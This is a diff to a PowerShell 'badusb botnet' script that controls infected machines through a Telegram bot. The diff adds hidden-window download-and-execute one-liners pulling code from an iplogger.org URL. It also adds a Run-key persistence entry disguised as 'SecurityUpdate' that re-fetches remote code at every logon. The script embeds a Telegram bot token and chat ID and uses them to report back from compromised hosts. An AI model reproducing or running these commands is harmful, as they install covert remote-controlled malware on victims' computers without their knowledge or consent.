@@ -6,19 +6,22 @@ BADUSB COMMANDS:
     #Execute script from github
     iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
     PowerShell.exe -WindowStyle Hidden -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
-    PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
+    PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://iplogger.org/2jaZG6'))
 REGEDIT:
 	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\SecurityUpdate.ps1"	
     https://www.akadia.com/services/windows_registry.html 
 BOT TELEGRAM:
     https://stackoverflow.com/questions/34457568/how-to-show-options-in-telegram-bot
-	#>
+    powershell -windowstyle hidden -command iex ((New-Object System.Net.WebClient).DownloadString('https://iplogger.org/2jaZG6'))
+    PowerShell -windowstyle iex -command ((New-Object System.Net.WebClient).DownloadString('https://iplogger.org/2jaZG6'))
+	powershell.exe -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('https://iplogger.org/2jaZG6')"
+
+    #>
 
 $BotToken = "1703588475:AAEyrNt2cuj-u6hWO8t3_NIbKLFVQyMDwNE"
 $ChatID = '928905258'
-$persistPath = 'https://raw.githubusercontent.com/halitAKAYDIN/halitAKAYDIN.github.io/master/download/SpaceSec_Bot.ps1'
-#$runPath= pwd + 'SecurityUpdate.ps1'
-
+$PersistPath = 'https://iplogger.org/2jaZG6'
+$DownArg ="powershell.exe -noni -nop -c " + "iex(New-Object System.Net.WebClient).DownloadString('https://iplogger.org/2jaZG6')"
 
 function Persist {
         reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /f
@@ -27,6 +30,8 @@ function Persist {
         Invoke-WebRequest -Uri $persistPath -OutFile C:\ProgramData\SecurityUpdate.ps1
         
 		    reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\ProgramData\SecurityUpdate.ps1"
+        reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate1 /t REG_SZ /d $DownArg
+
 
         $checkPersist = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String SecurityUpdate
         Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkPersist)" -UserAgent Edge -UseBasicParsing
